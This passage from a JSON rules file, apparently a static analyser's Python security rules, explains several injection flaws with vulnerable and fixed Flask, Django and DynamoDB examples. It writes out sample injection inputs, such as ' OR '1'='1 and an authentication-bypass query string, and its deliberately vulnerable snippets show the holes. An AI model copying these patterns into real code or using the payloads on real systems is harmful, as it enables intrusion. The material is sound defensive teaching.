manipulation</h4>\n<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread\nimpact.</p>\n<h4>Data deletion and denial of service</h4>\n<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the\nattacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Chaining DB injections with other vulnerabilities</h4>\n<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some\ndefense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple\nattacks with great impact:</p>\n<ul>\n  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>\n  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).\n    <ul>\n      <li> See <a href=\"https://blog.sonarsource.com/exploiting-hibernate-injections/\">our article on this topic</a> </li>\n    </ul>  </li>\n</ul>\n<h2>How to fix it in SQLAlchemy</h2>\n<h3>Code examples</h3>\n<p>The following code is an example of an overly simple data retrieval function. It is vulnerable to SQL injection because user-controlled data is\ninserted directly into a query string: The application assumes that incoming data always has a specific range of characters and ignores that some\ncharacters may change the query logic to a malicious one.</p>\n<p>In this particular case, the query can be exploited with the following string:</p>\n<pre>\n' OR '1'='1\n</pre>\n<p>Using the UNION clause, an attacker would also be able to perform queries against other tables and combine the returned data within the same query\nresult.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom flask import request\nimport sqlalchemy\n\n@app.route('/example')\ndef get_users():\n    user = request.args[\"user\"]\n    conn = sqlalchemy.create_engine(connection_string)\n    conn = engine.connect()\n\n    conn.execute(\"SELECT user FROM users WHERE user = '\" + user + \"'\") # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom flask import request\nimport sqlalchemy\n\n@app.route('/example')\ndef get_users():\n    user = request.args[\"user\"]\n    conn = sqlalchemy.create_engine(connection_string)\n    metadata = sqlalchemy.MetaData(bind=conn, reflect=True)\n    users = metadata.tables['users']\n    conn = engine.connect()\n\n    sql = users.select().where(users.c.user == user)\n    conn.execute(sql)\n</pre>\n<h3>How does this work?</h3>\n<h4>Use secure APIs</h4>\n<p>Some frameworks provide a database abstraction layer that frees the developers from sanitizing or writing prepared statements.</p>\n<p>These provided APIs can be described as \"secure by design\".<br> By providing a builder pattern with parameter binding behind the scenes,\n<code>SQLAlchemy</code> can be called \"secure by design\" as it adds multiple layers of security to the code while keeping the codebase shorter.</p>\n<p><strong>Note</strong>: These types of APIs can also provide \"raw\" functions or equivalents. These functions allow developers to create complex\nqueries using the user-friendly builder pattern.<br> These methods should be considered unsafe and should not be used with untrusted data. For\nexample, <code>SQLAlchemy</code> exposes <code>sqlalchemy.text()</code> that is prone to injections.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/exploiting-hibernate-injections/\">SonarSource, Exploiting Hibernate Injections</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html\">OWASP, SQL Injection Prevention Cheat\n  Sheet</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/89\">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ITdGBQ\">CERT, IDS00-J.</a> - Prevent SQL injection </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "pythonsecurity:S5147": {
        "name": "NoSQL operations should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>NoSQL injections occur when an application retrieves untrusted data and inserts it into a database query without sanitizing it first.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application that is vulnerable to NoSQL injection:<br> After discovering the injection point, attackers insert data into\nthe vulnerable field to execute malicious commands in the affected databases.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Identity spoofing and data leakage</h4>\n<p>In the context of simple query logic breakouts, a malicious database query enables privilege escalation or direct data leakage from one or more\ndatabases.<br> This threat is the most widespread impact.</p>\n<h4>Data deletion and denial of service</h4>\n<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the\nattacked organization does not maintain a disaster recovery plan (DRP) as missing data can disrupt the regular operations of an organization.</p>\n<h4>Chaining NoSQL injections with other vulnerabilities</h4>\n<p>Attackers who exploit NoSQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some\ndefense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple\nattacks with great impact:</p>\n<ul>\n  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>\n  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE). </li>\n</ul>\n<h2>How to fix it in Amazon DynamoDB</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to NoSQL injection because untrusted data is concatenated to the <code>FilterExpression</code> value. This\nexpression determines which items within the results should be returned.</p>\n<p>A malicious HTTP request containing the following query parameter values would allow an attacker to manipulate the returned data and bypass\nauthentication:</p>\n<pre>\nusername=admin&amp;password=size(password) or size(password)=size(password)\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@app.route('/login')\ndef login():\n    dynamodb = AWS_SESSION.client('dynamodb')\n\n    username = request.args[\"username\"]\n    password = request.args[\"password\"]\n\n    dynamodb.scan(\n        FilterExpression= \"username = \" + username + \" and password = \" + password, # Noncompliant\n        TableName=\"users\",\n        ProjectionExpression=\"username\"\n    )\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@app.route('/login')\ndef login():\n    dynamodb = AWS_SESSION.client('dynamodb')\n\n    username = request.args[\"username\"]\n    password = request.args[\"password\"]\n\n    dynamodb.query(\n        KeyConditionExpression= \"username = :u\",\n        FilterExpression= \"password = :p\",\n        ExpressionAttributeValues={\n            \":u\": { 'S': username },\n            \":p\": { 'S': password }\n        },\n        TableName=\"users\",\n        ProjectionExpression=\"username\"\n    )\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, the approach to protect against injection vulnerabilities is to ensure that untrusted data cannot break out of the initially\nintended logic.</p>\n<p>When using DynamoDB with Boto3, the best way to do so is by using expression attributes as placeholders (<code>:placeholder</code>). It will end up\nreplacing the attribute with the value defined in <code>ExpressionAttributeValues</code> and prevent any alteration of the original query logic. The\ncompliant code example uses such an approach.</p>\n<p>When possible, use the method <code>query</code> over <code>scan</code> as it disallows the <code>OR</code> operator on the\n<code>KeyConditionExpression</code> attribute and therefore reduces the attack surface. It also optimizes speed and costs.</p>\n<p>This logic applies both when using the <code>DynamoDB.Client</code> and the <code>DynamoDB.Table</code> class, though the syntax differs for the\nlatter, and the <code>ExpressionAttributeValues</code> would look like the following:</p>\n<pre>\nExpressionAttributeValues={\n    \":u\": username,\n    \":p\": password\n}\n</pre>\n<p>Although injection can occur on all the query or scan <code>Expression</code> attributes, its most severe impact occurs in the\n<code>FilterExpression</code>.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/nosql-injections-in-rocket-chat/\">SonarSource, NoSQL Injections in Rocket.Chat 3.12.1</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/943\">CWE-943 - Improper Neutralization of Special Elements in Data Query Logic</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "pythonsecurity:S5334": {
        "name": "Dynamic code execution should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br> An attacker can influence the\nbehavior of the targeted application and modify it to get access to sensitive data.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable\napplication.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code\nruns with root privileges, and therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of code injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Python Standard Library</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to arbitrary code execution because it runs dynamic Python code based on untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom flask import request\n\n@app.route(\"/\")\ndef example():\n    operation = request.args.get(\"operation\")\n    eval(f\"product_{operation}()\") # Noncompliant\n    return \"OK\"\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom flask import request\n\n@app.route(\"/\")\ndef example():\n    allowed = [\"add\", \"remove\", \"update\"]\n    operation = allowed[request.args.get(\"operationId\")]\n    eval(f\"product_{operation}()\")\n\n    return \"OK\"\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>\n<p>Anything that can be done via dynamic code execution can usually be done via a language’s native SDK and static code.<br> Therefore, our suggestion\nis to avoid executing code dynamically.<br> If the application requires the execution of dynamic code, additional security measures must be taken.</p>\n<h4>Dynamic parameters</h4>\n<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the\ndynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic\ncode and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and\nperform the processing.</p>\n<h4>Allow list</h4>\n<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage\nusing an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>\n<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the\nparameter is accepted. Otherwise, it is rejected and an error is raised.</p>\n<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where\nonly valid ones can be converted to a safe value.</p>\n<p>The example compliant code uses such a binding approach.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/moodle-remote-code-execution/\">SonarSource, Evil Teacher: Code Injection in Moodle</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/95\">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval\n  Injection')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "pythonsecurity:S6639": {
        "name": "Memory allocations should not be vulnerable to Denial of Service attacks",
        "htmlDesc": "<p>Memory allocation injections occur when an application computes the size of a piece of memory to be allocated from an untrusted source. In such a\ncase, an attacker could be able to make the application unwillingly consume an important amount of memory by enforcing a large allocation size.</p>\n<h2>Why is this an issue?</h2>\n<p>By repeatedly requesting a feature that consumes a lot of memory, attackers can constantly occupy an important part of an application’s hosting\nserver memory. Depending on the application’s deployment architecture, hosting server resources and attackers' capabilities, this can lead to an\nexhaustion of the available server’s memory.</p>\n<h3>What is the potential impact?</h3>\n<p>A server that faces a memory exhaustion situation can become unstable. The exact impact will depend on how the affected application is deployed and\nhow well the hosting server configuration is hardened.</p>\n<p>In the worst case, when the application is deployed in an uncontained environment, directly on its host system, the memory exhaustion will affect\nthe whole hosting server. The server’s operating system might start killing arbitrary memory-intensive processes, including the main application or\nother sensitive ones. This will result in a general operating failure, also known as a Denial of Service (DoS).</p>\n<p>In cases where the application is deployed in a virtualized or otherwise contained environment, or where memory usage limits are in place, the\nconsequences are limited to the vulnerable application only. In that case, other processes and applications hosted on the same server may keep on\nrunning without perturbation. The mainly affected application will still stop working properly.</p>\n<p>In general, that kind of DoS attack can have severe financial consequences. They are particularly important when the affected systems are\nbusiness-critical.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\ndef example():\n    limit = int(request.args.get('limit'))\n\n    data = '#' * limit  # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\ndef example():\n    limit = int(request.args.get('limit'))\n    restricted_limit = min(10, limit)\n\n    data = '#' * restricted_limit\n</pre>\n<h3>How does this work?</h3>\n<h4>Enforce an upper limit</h4>\n<p>When performing a memory allocation whose size depends on a user-controlled parameter, it is of prime importance to enforce an upper limit to the\nsize being allocated. This will prevent any overly big memory slot from being consumed by a single allocation.</p>\n<p>Note that forcing an upper limit will not prevent Denial of Service attacks. When an allocation size is restricted to a reasonable amount,\nattackers can still request the allocating feature multiple times until the combined allocation size becomes big enough to cause exhaustion. However,\nthe smaller the allowed allocation size, the higher the number of necessary requests and, thus, the higher the required resources on the attacker\nside. As for most of the DoS attack vectors, a trade-off must be found to prevent most attackers from causing exhaustion while keeping a good level of\nperformance and usability.</p>\n<p>Here, the example compliant code uses the <code>min</code> function to enforce a reasonable upper bound to the allocation size. In that case, no\nmore than 10 bytes can be allocated at a time.</p>\n<h4>Harden the execution environment configuration</h4>\n<p>As a defense in depth measure, it is advised to harden the execution environment configuration regarding memory usage. This can effectively reduce\nthe scope of a successful Denial of Service attack and prevent a complete outage, potentially ranging over multiple applications.</p>\n<p>When running the application in a contained environment, like a Docker container, it is usually possible to limit the amount of memory provided to\nthe contained environment. In that case, memory exhaustion will only impact the application hosting container and not the host system.</p>\n<p>When running the application directly on a physical or heavy virtualized server, memory limits can sometimes be set on the application’s associated\nservice account. For example, the <code>ulimit</code> mechanism of Unix based operating systems can be used for that purpose. With such a limit set\nup, memory exhaustion only impacts the applications and processes owned by the related service account.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://owasp.org/www-community/attacks/Denial_of_Service\">OWASP</a> - Denial of Service </li>\n  <li> <a href=\"https://www.linux.org/docs/man8/pam_limits.html\">Linux.org</a> - pam_limits - PAM module to limit resources </li>\n  <li> <a href=\"https://access.redhat.com/solutions/1257953\">RedHat</a> - How to set limits for services in RHEL and systemd </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/789\">CWE-789 - Memory Allocation with Excessive Size Value</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "pythonsecurity:S5131": {
        "name": "Endpoints should not be vulnerable to reflected cross-site scripting (XSS) attacks",
        "htmlDesc": "<p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of\nthe victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back\nto the user.</p>\n<h2>Why is this an issue?</h2>\n<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming\nHTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>\n<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own\nbrowser.</p>\n<p>A user with malicious intent carefully crafts the link beforehand.</p>\n<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>\n<h3>What is the potential impact?</h3>\n<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code\nthat can be interpreted by the target user’s browser, such as HTML, CSS, or JavaScript.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Vandalism on the front-end website</h4>\n<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and\ntheft of the benevolent user’s data.</p>\n<h4>Identity spoofing</h4>\n<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>\n<h4>Record user activity</h4>\n<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard\nactivity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>\n<h4>Chaining XSS with other vulnerabilities</h4>\n<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br> For\nexample, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code\ninjection vulnerability in the admin control panel of a web application.</p>\n<h2>How to fix it in Django</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to cross-site scripting because it returns an HTML response that contains user input.</p>\n<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by specifying the type of data returned in the response. For\nexample, you can use the <code>JsonResponse</code> class to return JSON messages securely.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom django.http import HttpResponse\nimport json\n\ndef index(request):\n    json = json.dumps({ \"data\": request.GET.get(\"input\") })\n    return HttpResponse(json)\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom django.http import JsonResponse\n\ndef index(request):\n    json = { \"data\": request.GET.get(\"input\") }\n    return JsonResponse(json)\n</pre>\n<p>It is also possible to set the content-type manually with the <code>content_type</code> parameter when creating an <code>HttpResponse</code>\nobject.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nfrom django.http import HttpResponse\n\ndef index(request):\n    return HttpResponse(request.GET.get(\"input\"))\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nfrom django.http import HttpResponse\n\ndef index(request):\n    return HttpResponse(request.GET.get(\"input\"), content_type=\"text/plain\")\n</pre>\n<h3>How does this work?</h3>\n<p>If the HTTP response consists of HTML code, it is highly recommended to use a template engine like <a\nhref=\"https://docs.djangoproject.com/en/4.0/topics/templates/\">Django’s template system</a> to generate it. The Django template engine separates the\nview from the business logic and automatically encodes the output of variables, drastically reducing the risk of cross-site scripting\nvulnerabilities.</p>\n<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by telling them what data they are receiving with the\n<code>content-type</code> HTTP header. This header tells the browser that the response does not contain HTML code and should not be parsed and\ninterpreted as HTML. Thus, the response is not vulnerable to reflected cross-site scripting.</p>\n<p>For example, setting the Content-Type HTTP header to <code>text/plain</code> allows to safely reflect user input, because browsers will not try to\nparse and execute the response.</p>\n<h3>Pitfalls</h3>\n<h4>Content-types</h4>\n<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to\ncross-site scripting vulnerabilities.<br> The following content-types are known to be affected:</p>\n<ul>\n  <li> application/mathml+xml </li>\n  <li> application/rdf+xml </li>\n  <li> application/vnd.wap.xhtml+xml </li>\n  <li> application/xhtml+xml </li>\n  <li> application/xml </li>\n  <li> image/svg+xml </li>\n  <li> multipart/x-mixed-replace </li>\n  <li> text/html </li>\n  <li> text/rdf </li>\n  <li> text/xml </li>\n  <li> text/xsl </li>\n</ul>\n<h4>The limits of validation</h4>\n<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the\nrecommended approach.</p>\n<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is\nsometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the\nfilters.</p>\n<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is\ntrying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,\nin the long run, is very difficult.</p>\n<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of \"javascript:\" URI.</p>\n<h3>Going the extra mile</h3>\n<h4>Content Security Policy (CSP) Header</h4>\n<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to\n<strong>block</strong> loading data that does not meet the application’s security requirements. If configured correctly, this can prevent any attempt\nto exploit XSS in the application.<br> <a href=\"https://web.dev/csp-xss/\">Learn more here.</a></p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\">OWASP Cheat Sheet</a> - XSS\n  Prevention Cheat Sheet </li>\n  <li> <a href=\"https://docs.djangoproject.com/en/4.0/ref/request-response/\">Django Project, Request and response objects (Django 4.0)</a> </li>\n  <li> <a href=\"https://docs.djangoproject.com/en/4.0/ref/templates/builtins\">Django, Built-in template tags and filters</a> </li>\n  <li> <a href=\"https://flask.palletsprojects.com/en/2.1.x/security/?highlight=xss#cross-site-scripting-xss\">Flask, Security Considerations</a> </li>\n  <li> <a href=\"https://jinja.palletsprojects.com/en/3.0.x/templates/\">The Pallets Projects, Jinja, Template Designer Documentation</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/wordpress-stored-xss-vulnerability\">SonarSource, WordPress 5.8.2 Stored XSS Vulnerability</a> </li>\n  <li> <a href=\"https://blog.sonarsource.com/ghost-admin-takeover\">SonarSource, Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li>\n  <li> <a href=\"https://samy.pl/myspace/\">Samy Kamkar, The MySpace Worm</a> </li>\n</ul>\n<h3>Conference presentations</h3>\n<ul>\n  <li> <a href=\"https://www.youtube.com/watch?v=ksq7e6UUDag\">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "pythonsecurity:S5496": {
        "name": "Server-side templates should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Server-side template injections occur in an application when the application retrieves data from a user or a third-party service and inserts it\ninto a template, without sanitizing it first.</p>\n<p>If an application contains a template that is vulnerable to injections, it is exposed to attacks that target the underlying rendering server.</p>\n<p>A user with malicious intent can create requests that will cause the template to change its logic into unwanted behavior.</p>\n<p>After creating the malicious request, the attacker can attack the servers affected by this vulnerability without relying on any prerequisites.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting a server-side template injection vulnerability will be able to execute arbitrary commands on the underlying operating\nsystem.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,\nand therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of OS injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>The following code is vulnerable to server-side template injection because it is inserting untrusted inputs into a string that is then processed\nfor rendering.<br> This vulnerability arises because the rendering function does not validate the input, allowing attackers to potentially inject\nmalicious Python code for execution.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom flask import request, render_template_string\n\n@app.route('/example')\ndef example():\n    username = request.args.get('username')\n    template = f\"&lt;p&gt;Hello {username}&lt;/p&gt;\"\n    return render_template_string(template) # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom flask import request, render_template_string\n\n@app.route('/example')\ndef example():\n    username = request.args.get('username')\n    template = \"&lt;p&gt;Hello {{ username }}&lt;/p&gt;\"\n    return render_template_string(template, username=username)\n</pre>\n<h3>How does this work?</h3>\n<h4>Use template variables</h4>\n<p>The universal method to prevent path injection is to sanitize untrusted data. Manual sanitization is error-prone, so it is best to automate the\nprocess.</p>\n<p>Here, <code>render_template_string</code> automatically sanitizes template variables by escaping them. This means that any untrusted data will not\nbe able to break out of the initially intended template logic.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee\">SSTI in Flask/Jinja2</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/94\">CWE-94 - Improper Control of Generation of Code</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "pythonsecurity:S6839": {
        "name": "HTTP response headers should not be vulnerable to response splitting attacks",
        "htmlDesc": "<p>HTTP Response Splitting is a type of web application vulnerability that occurs when an attacker manipulates the data input into HTTP headers. This\nmanipulation can lead to the creation of additional, unauthorized HTTP responses. The vulnerability arises when user-supplied data is not properly\nvalidated and sanitized before being included in an HTTP response header. This can potentially allow an attacker to control the contents of the HTTP\nresponse received by other users, leading to a variety of consequences such as cross-site scripting (XSS), session hijacking, cache poisonning, or\nmalware delivery.</p>\n<h2>Why is this an issue?</h2>\n<p>Without proper validation or sanitation, an attacker with control over a header’s content could insert line return characters in it and inject\narbitrary content in the HTTP response. This includes headers, their content, and the response body.</p>\n<h3>What is the potential impact</h3>\n<p>HTTP Response Splitting is a significant security concern due to its potential to compromise the integrity and confidentiality of web applications\nand their users' data. Typical exploitation scenarios include Cross-Site Scripting (XSS), phishing attacks or cache poisonning.</p>\n<h4>Cross-Site Scripting (XSS)</h4>\n<p>When an attacker successfully exploits an HTTP Response Splitting vulnerability, they can inject malicious scripts into the HTTP response. These\nscripts can be executed in the user’s browser, leading to an XSS attack. This can result in unauthorized access to sensitive user data, such as login\ncredentials or personal information.</p>\n<h4>Phishing Attacks</h4>\n<p>An attacker can use this vulnerability to redirect users to a malicious website that looks identical to the original one. Unaware users might\nprovide sensitive information like usernames, passwords, or credit card details, thinking they are on a legitimate site.</p>\n<h4>Cache poisonning</h4>\n<p>By controlling the content and headers of the 